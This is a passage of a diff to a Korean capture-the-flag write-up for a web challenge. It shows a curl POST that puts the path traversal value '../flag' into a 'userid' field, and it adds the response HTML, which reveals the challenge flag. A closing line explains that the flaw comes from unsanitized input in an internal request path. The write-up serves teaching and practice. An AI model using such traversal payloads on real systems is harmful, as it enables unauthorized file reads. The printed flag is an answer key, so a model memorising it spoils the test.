@@ -49,6 +49,13 @@ curl -X POST 'http://서버주소:포트/get_info' --data-urlencode 'userid=../f
 
 `userid=../flag`는 코드에서 받는 `userid`에 `../flag`를 넣는다는 뜻이다. `--data-urlencode`는 이 값을 폼 데이터로 전송한다.
 
-**3.** 응답에서 플래그를 확인한다.
+**3.** 응답 HTML에서 플래그를 확인한다. (중간 내용 생략)
+
+```html
+...
+<h1>Get User Info</h1><br/>
+<pre>DH{8a33bb6fe0a37522bdc8adb65116b2d4}
+...
+```
 
 > 입력값을 내부 요청 경로에 그대로 넣어서 생긴 문제다.
